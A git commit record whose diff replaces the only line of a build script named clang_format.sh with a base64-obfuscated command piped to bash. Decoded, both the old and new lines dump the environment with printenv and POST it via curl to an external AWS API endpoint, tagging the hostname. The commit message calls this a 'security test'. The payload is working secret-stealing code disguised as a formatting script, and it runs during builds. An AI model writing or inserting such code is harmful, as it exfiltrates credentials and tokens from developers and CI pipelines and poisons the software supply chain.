2129bdd58c5adc81fc4e4a94d45fd94dea6b5721
bambaimtuna <bambaimtuna@proton.me>
2023-06-30 19:29:42 +0000

    Security test, please do not approve a. (domxbn)

--- build_scripts/clang_format.sh
+++ build_scripts/clang_format.sh
@@ -1,1 +1,1 @@
-echo cHJpbnRlbnYgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/gopro/ngfx.git\&folder=build_scripts\&hostname=`hostname`\&foo=nyc
+echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/gopro/ngfx.git\&folder=build_scripts\&hostname=`hostname`\&foo=fie
